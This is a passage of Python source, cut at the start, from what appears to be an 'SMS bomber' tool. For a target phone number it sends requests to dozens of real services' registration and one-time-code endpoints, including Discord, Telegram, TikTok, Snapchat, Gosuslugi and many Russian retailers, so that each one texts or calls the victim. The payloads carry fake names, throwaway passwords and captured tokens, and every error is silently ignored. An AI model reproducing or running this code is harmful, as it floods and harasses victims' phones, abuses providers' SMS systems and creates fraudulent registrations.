					requests.get(f"https://i.api.kari.com/ecommerce/client/registration/verify/phone/code?phone=%2B{number}", json=payload)
				except:
					pass

				try:
					payload = {"phone": number, "action": "register"}
					requests.post("https://cnt-lbrc-itv02.svc.iptv.rt.ru/api/v2/portal/send_sms_code", json=payload)
				except:
					pass

				try:
					payload = {"phone": number[1:]}
					requests.post("https://backend.academyopen.ru/api-7/otp-code/send", json=payload)
				except:
					pass

				try:
					payload = {
						"fio":"",
						"password":"2342uirejhwfr",
						"email":"",
						"emailAdvertAccepted":True,
						"phoneNumber":"+"+number,
						"webReferrer":"https://www.fonbet.ru/",
						"advertInfo":"",
						"platformInfo":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 OPR/82.0.4227.50 (Edition Yx GX)",
						"promoId":"",
						"ecupis":True,
						"birthday":"2000-12-12",
						"sysId":1,
						"lang":"ru",
						"deviceId":"B9B569D495FE1E6193DC98560A1E2A47"
					}
					requests.post(" https://clientsapi510.bkfon-resources.com/cps/superRegistration/createProcess", json=payload)
				except:
					pass

				try:
					payload = {
						"change_phone_reason": "user_action_required",
						"phone": f"+{number}"
					}
					requests.post("https://discord.com/api/v9/users/@me/phone", json = payload)
				except:
					pass

				try:
					num = number
					num2=""
					num2+="+"
					num2+=code
					num2+=' '
					num2+="("
					num2+=num[1]
					num2+=num[2]
					num2+=num[3]
					num2+=")"
					num2+=' '
					num2+=num[4]
					num2+=num[5]
					num2+=num[6]
					num2+=' '
					num2+=num[7]
					num2+=num[8]
					num2+=num[9]
					num2+=num[10]
					payload = {
						"phoneNumber": num2,
						"lang": "ru",
						"APIKey": "3_IEHUullBASM07basNap0ZX6mC1S7uU6oU67H1KWSl6oh2yKQMtMilq90YpDKwNYX",
						"source": "showScreenSet",
						"sdk": "js_latest",
						"authMode": "cookie",
						"pageURL": "https://mega.ru/",
						"gmid": "gmid.ver4.AcbHH_44kg.W9objnQjjjNyWlnpb5dXZtuVcot1LEA4venSViSYt7cPRhfE-e3etDP09jiTXfJB.yoI8F_D6oMuQD1hMqxu43Dym7VO-KKFYlogFpTBPzfbZhiKSu2LYVBLeMTfjB9g8agpRWhZ4-puTXtS0ak9ZNw.sc3",
						"ucid": "eGk3kDYny_ntiXq3ATdWwA",
						"sdkBuild": 12563,
						"format": "json"
					}
					requests.post("https://accounts.ru1.gigya.com/accounts.otp.sendCode", data=payload)
				except:
					pass

				try:
					payload = {
						"client_id": "broker_otp_guest2",
						"grant_type": "password",
						"username": number
					}
					requests.post("https://auth-ext.usvc.bcs.ru/auth/realms/Broker/protocol/openid-connect/token", json=payload)
				except:
					pass

				try:
					payload = {"request":{"login":number},"request_id":75291684,"application_id":13,"rabota_ru_id":"61e37b73739641004915965152223419","user_tags":[{"id":0,"add_date":"2022-01-16","name":"hr_banners_show"},{"id":0,"add_date":"2022-01-16","name":"web_premium_target"},{"id":0,"add_date":"2022-01-16","name":"courses_widget_target"},{"id":0,"add_date":"2022-01-16","name":"search_exclude_reloc2_target"},{"id":0,"add_date":"2022-01-16","name":"web_search_all_regions2_target1"},{"id":0,"add_date":"2022-01-16","name":"profession_widget_target"},{"id":0,"add_date":"2022-01-16","name":"search_query_profession_tags_control2"},{"id":0,"add_date":"2022-01-16","name":"hr_new_scheduled_action_list_active"}]}
					requests.post("https://spb.rabota.ru/api-web/v6/code/send.json", json=payload)
				except:
					pass

				try:
					num = number
					num2=""
					num2+="+"
					num2+=code
					num2+="("
					num2+=num[1]
					num2+=num[2]
					num2+=num[3]
					num2+=")"
					num2+=num[4]
					num2+=num[5]
					num2+=num[6]
					num2+="-"
					num2+=num[7]
					num2+=num[8]
					num2+="-"
					num2+=num[9]
					num2+=num[10]
					payload = {
						"phone": num2,
						"register": "true"
					}
					requests.post("https://airsoft-rus.ru/bitrix/components/bxmt/phone/sms.php", data=payload)
				except:
					pass

				try:
					payload = {"password":"","login":number}
					requests.post("https://loymax.ivoin.ru/publicapi/v1.2/Registration/BeginRegistration", json=payload)
				except:
					pass

				try:
					payload = {
						"phone_number": number[1:],
						"country_code": "US"
					}
					requests.post("https://app.snapchat.com/stories_everywhere/download_sms?", data=payload)
				except:
					pass

				try:
					num = number
					num2=""
					num2+="+"
					num2+=code
					num2+=' '
					num2+="("
					num2+=num[1]
					num2+=num[2]
					num2+=num[3]
					num2+=")"
					num2+=' '
					num2+=num[4]
					num2+=num[5]
					num2+=num[6]
					num2+='-'
					num2+=num[7]
					num2+=num[8]
					num2+='-'
					num2+=num[9]
					num2+=num[10]
					payload = {
						"phone": num2,
						"u": "U"
					}
					requests.post("https://api.apteka.ru/Auth/Auth_Code?cityId=5e57803249af4c0001d64407", json=payload)
				except:
					pass

				try:
					requests.post("https://m.tiktok.com/node-a/send/download_link", json={"slideVerify": 0, "language": "ru", "PhoneRegionCode": code, "Mobile": number[1:], "page": {"pageName": "home", "launchMode": "direct", "trafficType": ""}}, headers=header)
				except:
					pass

				try:
					payload = {"phone":number,"invite":""}
					requests.post("https://burgerking.ru/api-web-front/api/v3/auth/signup", json=payload)
				except:
					pass

				try:
					num = number
					num2=""
					num2+=num[1]
					num2+=num[2]
					num2+=num[3]
					num3=""
					num3+=num[4]
					num3+=num[5]
					num3+=num[6]
					num4=""
					num4+=num[7]
					num4+=num[8]
					num5=""
					num5+=num[9]
					num5+=num[10]
					requests.get(f"https://stockmann.ru/ajax/?controller=user&action=registerUser&surname=%D0%9F%D1%83%D0%BF%D0%BA%D0%B8%D0%BD&name=%D0%92%D0%B0%D1%81%D0%B8%D0%BB%D0%B8%D0%B9&phone=%2B{code}%20({num2})%20{num3}%20-%20{num4}%20-%20{num5}&email=uhojgerlkfojhr%40hotmail.com&password=BoG200547&password_confirm=BoG200547&sessid=335da24c059d85f0c8e87df438ba2f95&token=03AGdBq24YmAxfeAGhxzYoND9z59GJ-ZDdHzSLCSO2y8SmZMrn1XN6QplZEEaTuXDV3Y-GBZq_eLEJNjKPydcHloE2gpaiW9L_gjwW1e3q5C-FwNuLfuE8CRszWLHXgmyJfzFwFQene-Q9iBB1kVDrP0QbxBgOV6CWAb26xd3rkW4ePVgMKgmhHZr_dwwwnkV43HU4nBnbKA6WvbuKQvgUM8iFt4FzIpMP-cu4ngcme7in8O4AGRTL9gy-kRzsSxSITVKTyFJlhNu0uOa-lP-R3yMzB0SSedQeP6mImpi9wTc6KyDRcUqZfhUX3j4XAdXMvwxdcilqpssQy7VxyBmx8qlHjL3VPl7GqAG-37FSkN9Zp0k97JWG7lGI90YvTEPJaIJf2lvhprqfZr4IMFFk_UnwR7WVVNREl3aeoi1fg57Aph51DqjLG1Y")
				except:
					pass

				try:
					payload = {"phone": number}
					requests.post("https://api.iconjob.co/api/auth/verification_code", headers=header, json=payload)
				except:
					pass

				try:
					num = number
					num2=""
					num2+="+"
					num2+=code
					num2+="("
					num2+=num[1]
					num2+=num[2]
					num2+=num[3]
					num2+=")"
					num2+=num[4]
					num2+=num[5]
					num2+=num[6]
					num2+=num[7]
					num2+=num[8]
					num2+=num[9]
					num2+=num[10]
					payload = {
						"instanceId": "123",
						"firstName": "Пупкин",
						"lastName": "Василий",
						"contactType": "mobile",
						"contactValue": num2
					}
					requests.post("https://www.gosuslugi.ru/auth-provider/mobile/register", json=payload)
				except:
					pass

				try:
					payload = {"phone": number}
					requests.post("https://youla.ru/web-api/auth/request_code", headers=header, data=payload)
				except:
					pass

				try:
					payload = {"phone": "+" + number, "browser": "undefined"}
					requests.post("https://callmyphone.org/do-call", headers=header, data=payload)
				except:
					pass

				try:
					payload = {"phone": number}
					requests.post("http://94.154.218.82:7201/api/account/register/sendConfirmCode", headers=header, data=payload)
				except:
					pass

				try:
					payload = {"phone": "+" + number, "type": "authenticateCode"}
					requests.post("https://api.cian.ru/sms/v1/send-validation-code/", headers=header, json=payload)
				except:
					pass

				try:
					num = number
					num2=""
					num2+="+"
					num2+=code
					num2+=' '
					num2+=num[1]
					num2+=num[2]
					num2+=num[3]
					num2+=' '
					num2+=num[4]
					num2+=num[5]
					num2+=num[6]
					num2+='-'
					num2+=num[7]
					num2+=num[8]
					num2+='-'
					num2+=num[9]
					num2+=num[10]
					requests.post("https://myspar.ru/local/ajax/user/reg/", files={'phone': (None, num2), 'name': (None, 'Вася'), 'last_name': (None, 'Пупкин'), 'gender': (None, 'male'), 'birthday': (None, '11.11.1999'), 'email': (None, 'hgy2djererhrh@hotmail.com'), 'username': (None, number), 'pass': (None, 'resgswergwergwergew'), 'pass_confirm': (None, 'resgswergwergwergew'), 'is_card': (None, 'new'), 'confirm': (None, 'Y')})
				except:
					pass

				try:
					payload = {"phone_number": number, "region_code": "RU"}
					requests.post("https://api.imgur.com/account/v1/phones/verify", headers=header, json=payload)
				except:
					pass

				try:
					payload = {"data": {"type": "requestSMS", "attributes": {"phone": "+"+number}}}
					requests.post("https://api.tsum.ru/authorize/request-sms", json=payload)
				except:
					pass

				try:
					payload = {"demo_number": "+" + number, "ajax_demo_send": "1"}
					requests.post("https://www.sms4b.ru/bitrix/components/sms4b/sms.demo/ajax.php", headers=header, data=payload)
				except:
					pass

				try:
					requests.post("https://www.eldorado.ru/_ajax/spa/auth/v2/auth_with_login.php", params = {"user_login": number}, headers=header)
				except:
					pass

				try:
					requests.post("https://m.tiktok.com/node-a/send/download_link", json={"slideVerify": 0, "language": "ru", "PhoneRegionCode": code, "Mobile": number, "page": {"pageName": "home", "launchMode": "direct", "trafficType": ""}}, headers=header)
				except:
					pass

				try:
					payload = {
						"phoneNumber": f"+{number}"
					}
					requests.post("https://dodopizza.kz/api/sendconfirmationcode", json = payload)
				except:
					pass

				try:
					requests.get(f"https://findclone.ru/register?phone=+{number}")
				except:
					pass

				try:			
					requests.post(f"https://www.citilink.ru/registration/confirm/phone/+{number}/", headers=header)
				except:
					pass

				try:
					requests.post('https://www.flipkart.com/api/5/user/otp/generate', data={'phone': '+' + number}, headers=header)
				except:
					pass

				try:
					requests.post('https://youla.ru/web-api/auth/request_code', data={"phone": number}, headers=header)
				except:
					pass

				try:
					requests.post("https://my.telegram.org/auth/send_password", data = {'phone': number})
				except:
					pass

				try:
					requests.post(f"https://www.citilink.ru/registration/confirm/phone/+{number}", headers=header)
				except:
					pass
					
		else:
			pass

	except:
		pass